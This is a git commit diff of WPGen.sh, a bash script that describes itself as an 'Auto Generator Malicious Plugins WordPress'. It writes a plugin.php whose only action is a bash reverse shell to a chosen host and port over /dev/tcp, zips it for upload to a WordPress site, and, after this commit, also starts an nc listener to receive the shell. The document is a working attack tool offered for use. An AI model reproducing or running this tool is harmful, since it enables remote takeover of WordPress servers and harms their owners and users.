e9bd41856bafe7f1f88c61f25c98927993195212
Miguel R <d4t4s3c@protonmail.com>
2022-02-23 17:49:22 +0100

    UPDATE

--- WPGen.sh
+++ WPGen.sh
@@ -7,28 +7,29 @@ declare -r Blue="\e[34m"
 declare -r Red="\e[31m"
 declare -r End="\e[0m"
 
-declare -r f1='['
-declare -r f2=']'
-declare -r f3='i'
-declare -r f4='<'
-declare -r f5='>'
-declare -r f6='+'
-declare -r f7='x'
-declare -r f8='|'
+declare -r f1='<'
+declare -r f2='>'
+declare -r f3=' =============================================='
+declare -r f4='|'
+declare -r f5='Example:'
+declare -r f6='Compress:'
+declare -r f7='Creating:'
+declare -r f8='Generated:'
 declare -r f9='ZIP Not Installed'
-declare -r f10='interface'
+declare -r f10='lhost'
 declare -r f11='lport'
 declare -r f12='Installing ZIP'
 declare -r f13='ZIP Instaled'
-declare -r f14='Generating Plugin'
-declare -r f15='Plugin Generated'
-declare -r f16=' =============================================='
-declare -r f17='Example:'
-declare -r f18='  Auto Generator Malicious Plugins WordPress'
-declare -r f19='WPGen'
-declare -r int="$1"
-declare -r lp="$2"
-declare -r lh=$(/usr/bin/ip -4 address show $int | /usr/bin/grep 'inet' | /usr/bin/awk '{print $2}' | /usr/bin/cut -d/ -f 1)
+declare -r f14='  Auto Generator Malicious Plugins WordPress'
+declare -r f15='WPGen'
+declare -r f16='[+]'
+declare -r f17='[-]'
+declare -r f18='[!]'
+declare -r f19='[*]'
+declare -r f20='plugin.php'
+declare -r f21='plugin.zip'
+declare -r f22='Listening:'
+declare -r f23='nc -lvnp'
 
 function check(){
 	which zip > /dev/null 2>&1
@@ -36,17 +37,15 @@ function check(){
         :
     else
         echo ""
-        echo -e "$Blue$f1$Red$f7$Blue$f2 $Green$f9$End"
-        sleep 4
-        echo ""
-        echo -e "$Blue$f1$Yellow$f3$Blue$f2 $Green$f12$End"
-        sleep 4
+        echo -e "$Red$f17 $White$f9$End"
+        sleep 2
+        echo -e "$Yellow$f18 $White$f12$End"
+        sleep 2
         apt-get install zip -y > /dev/null 2>&1
+        echo -e "$Green$f16 $White$f13$End"
         echo ""
-        echo -e "$Blue$f1$Green$f3$Blue$f2 $Green$f13$End"
-        sleep 4
-        echo ""
-        exit 1
+        sleep 2
+        exit 0
     fi
 }
 
@@ -58,18 +57,25 @@ function banner(){
     echo -e "$Blue \        / |    |     $White\    \_\  \  ___/|   |  \\ $End"
     echo -e "$Blue  \__/\  /  |____|     $White \______  /\___  >___|  /  $End"
     echo -e "$Blue       \/              $White        \/     \/     \/   $End"
-    echo -e "$Blue$f16$End"
-    echo -e "$White$f8$Green$f18  $White$f8$End"
-    echo -e "$Blue$f16$Blue$End"
+    echo -e "$Blue$f3$End"
+    echo -e "$White$f4$Green$f14  $White$f4$End"
+    echo -e "$Blue$f3$Blue$End"
 }
 
 function main(){
     echo ""
-    echo -e "$Blue$f1$Yellow$f3$Blue$f2 $Green$f17 $Yellow$f19 $Red$f4$White$f10$Red$f5 $Red$f4$White$f11$Red$f5$End"
+    echo -e "$Yellow$f18 $Green$f5 $White$f15 -l $Red$f1$White$f10$Red$f2$White -p $Red$f1$White$f11$Red$f2$End"
     echo ""
 }
 
-if [ ! -z $int ]; then
+while getopts "h:p:" arg; do
+    case $arg in
+        h) lhost=$OPTARG; let parameter_counter+=1 ;;
+	p) lport=$OPTARG; let parameter_counter+=1 ;;
+    esac
+done
+
+if [ ! -z $lhost ]; then
     check
 else
     banner
@@ -77,7 +83,7 @@ else
     exit 0
 fi
 
-if [ ! -z $lp ]; then
+if [ ! -z $lport ]; then
     banner
 else
     banner
@@ -87,9 +93,8 @@ fi
 
 function createPlugin(){
     echo ""
-    echo -e "$Blue$f1$Yellow$f3$Blue$f2 $Green$f14$End"
-    sleep 4
-    echo ""
+    echo -e "$Blue$f19 $White$f7  $Red$f20$End"
+    sleep 2
 
 cat <<EOF > plugin.php
 <?php
@@ -103,7 +108,7 @@ cat <<EOF > plugin.php
 * Author URI: https://github.com/d4t4s3c
 */
 
-exec("/bin/bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1'");
+exec("/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'");
 ?>
 EOF
 }
@@ -111,14 +116,22 @@ EOF
 function compressPlugin(){
     /usr/bin/zip plugin.zip plugin.php > /dev/null 2>&1
     rm -rf plugin.php
-    echo -e "$Blue$f1$Green$f6$Blue$f2 $Green$f15$End"
-    echo ""
-    sleep 4
+    echo -e "$Yellow$f18 $White$f6  $Red$f20$End"
+    sleep 2
+    echo -e "$Green$f16 $White$f8 $Green$f21$End"
+    sleep 2
 }
 
+function listener(){
+    echo -e "$Blue$f18 $White$f22 $Red$f23 $lport$End"
+    sleep 2
+    echo ""
+    nc -lvnp $lport
+}
 function start(){
     createPlugin
     compressPlugin
+    listener
 }
 
 start
